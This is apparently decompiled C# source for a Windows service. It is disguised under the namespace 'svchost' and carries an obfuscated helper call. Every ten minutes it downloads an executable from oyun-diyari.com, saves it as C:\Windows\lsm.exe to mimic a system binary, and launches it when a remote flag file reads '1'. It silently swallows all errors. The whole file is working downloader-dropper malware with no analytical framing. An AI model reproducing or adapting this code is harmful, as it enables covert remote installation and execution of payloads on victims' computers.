using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.ServiceProcess;
using System.Timers;

namespace svchost;

public class Service1 : ServiceBase
{
	private delegate void Delegate0(long long_0, long long_1);

	private IContainer icontainer_0;

	private Stream stream_0;

	private Stream stream_1;

	private string string_0;

	private Timer timer_0;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void method_0()
	{
		icontainer_0 = new Container();
		((ServiceBase)this).set_ServiceName("Service1");
	}

	public Service1()
	{
		Class3.xfxU1RjzuVJwO();
		string_0 = "C:\\Windows\\Update.log";
		timer_0 = new Timer();
		((ServiceBase)this)._002Ector();
		method_0();
	}

	private void method_1()
	{
		try
		{
			using (WebClient webClient = new WebClient())
			{
				stream_0 = webClient.OpenRead("http://www.oyun-diyari.com/versiyon.txt");
				stream_1 = new FileStream("C:\\Windows\\Update.log", FileMode.Create, FileAccess.Write, FileShare.None);
				int num = 0;
				byte[] array = new byte[2048];
				while ((num = stream_0.Read(array, 0, array.Length)) > 0)
				{
					stream_1.Write(array, 0, num);
				}
			}
			stream_0.Close();
			stream_1.Close();
		}
		catch
		{
		}
	}

	private void method_2()
	{
		try
		{
			using (WebClient webClient = new WebClient())
			{
				stream_0 = webClient.OpenRead("http://www.oyun-diyari.com/new.exe");
				stream_1 = new FileStream("C:\\Windows\\lsm.exe", FileMode.Create, FileAccess.Write, FileShare.None);
				int num = 0;
				byte[] array = new byte[2048];
				while ((num = stream_0.Read(array, 0, array.Length)) > 0)
				{
					stream_1.Write(array, 0, num);
				}
			}
			stream_0.Close();
			stream_1.Close();
		}
		catch
		{
		}
	}

	private void method_3()
	{
		StreamReader streamReader = new StreamReader(WebRequest.Create("http://www.oyun-diyari.com/remote.txt").GetResponse().GetResponseStream());
		string empty = string.Empty;
		string text = string.Empty;
		for (empty = streamReader.ReadLine(); empty != null; empty = streamReader.ReadLine())
		{
			Console.WriteLine(empty);
			if (empty != null && empty != string.Empty)
			{
				text = empty;
			}
		}
		streamReader.Close();
		if (text == "1")
		{
			Process.Start("C:\\Windows\\lsm.exe");
		}
	}

	private void method_4()
	{
		StreamReader streamReader = new StreamReader(WebRequest.Create("http://www.oyun-diyari.com/versiyon.txt").GetResponse().GetResponseStream());
		string empty = string.Empty;
		string text = string.Empty;
		for (empty = streamReader.ReadLine(); empty != null; empty = streamReader.ReadLine())
		{
			Console.WriteLine(empty);
			if (empty != null && empty != string.Empty)
			{
				text = empty;
			}
		}
		streamReader.Close();
		StreamReader streamReader2 = File.OpenText(string_0);
		string empty2 = string.Empty;
		string text2 = string.Empty;
		for (empty2 = streamReader2.ReadLine(); empty2 != null; empty2 = streamReader2.ReadLine())
		{
			Console.WriteLine(empty2);
			if (empty2 != null && empty2 != string.Empty)
			{
				text2 = empty2;
			}
		}
		streamReader2.Close();
		if (text != text2)
		{
			method_1();
			method_2();
			method_3();
		}
		else if (File.Exists("C:\\Windows\\lsm.exe"))
		{
			method_3();
		}
		else
		{
			method_2();
			method_3();
		}
	}

	protected override void OnStart(string[] args)
	{
		timer_0.Interval = 600000.0;
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.Start();
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		if (!File.Exists(string_0))
		{
			method_1();
			method_2();
			method_3();
		}
		else
		{
			method_4();
		}
		timer_0.Stop();
	}

	protected override void OnStop()
	{
		timer_0.Stop();
	}
}
